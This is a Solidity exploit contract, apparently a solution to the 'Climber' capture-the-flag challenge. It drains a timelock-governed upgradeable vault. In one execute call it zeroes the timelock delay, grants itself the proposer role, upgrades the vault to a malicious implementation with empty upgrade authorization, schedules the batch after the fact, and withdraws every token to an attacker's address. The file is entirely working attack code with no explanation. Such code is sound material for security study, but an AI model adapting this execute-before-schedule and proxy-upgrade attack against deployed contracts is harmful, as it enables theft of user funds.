// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "../climber/ClimberVault.sol";
import "hardhat/console.sol";
/**
 * @title ClimberExploit
 * @author Jasmine Abtahi
 */

contract NewVault is UUPSUpgradeable{
    address public immutable recepient;
    IERC20 public immutable token;

    constructor(address _recepient, address _token) {
        recepient =_recepient;
        token = IERC20(_token);
    }

    function withdraw() public {
        token.transfer(recepient, token.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

contract ClimberExploit {

    ClimberVault public immutable vault;
    ClimberTimelock public immutable timelock;
    address public immutable token;
    address[] targets = new address[](4);
    bytes[] dataElements = new bytes[](4);

    constructor(address _vault, address _token) {
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(payable(vault.owner()));
        token = _token;
    }

    function attack(address receipent) external {
        NewVault newVault = new NewVault(receipent, token);
        uint256[] memory values = new uint256[](4);

        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(this);

        dataElements[0] = abi.encodeCall(timelock.updateDelay, (0));
        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));
        dataElements[2] = abi.encodeCall(vault.upgradeTo, (address(newVault)));
        dataElements[3] = abi.encodeCall(this.orderSchedule, ());
        
        timelock.execute(targets, values, dataElements, 0);

        address(vault).call(abi.encodeCall(NewVault.withdraw, ()));
    }

    function orderSchedule() external{
        uint256[] memory values = new uint256[](4);
        timelock.schedule(targets, values, dataElements, 0);
    }
}

